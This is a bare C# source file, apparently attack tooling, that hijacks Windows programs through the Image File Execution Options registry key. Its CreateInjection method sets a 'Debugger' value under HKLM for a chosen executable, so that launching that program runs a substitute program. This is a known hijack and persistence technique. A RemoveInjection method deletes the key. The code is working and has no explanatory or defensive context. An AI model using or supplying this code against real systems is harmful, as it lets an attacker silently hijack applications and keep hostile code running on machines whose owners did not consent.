using System;
using Microsoft.Win32;

namespace IFEOInjection
{
    public class Program
    {
        public static void CreateInjection(string targetApp, string injectedApp)
        {
            string keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetApp;
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(keyPath))
            {
                key.SetValue("Debugger", injectedApp, RegistryValueKind.String);
            }
        }

        public static void RemoveInjection(string targetApp)
        {
            string keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetApp;
            Registry.LocalMachine.DeleteSubKey(keyPath, false);
        }
    }
}
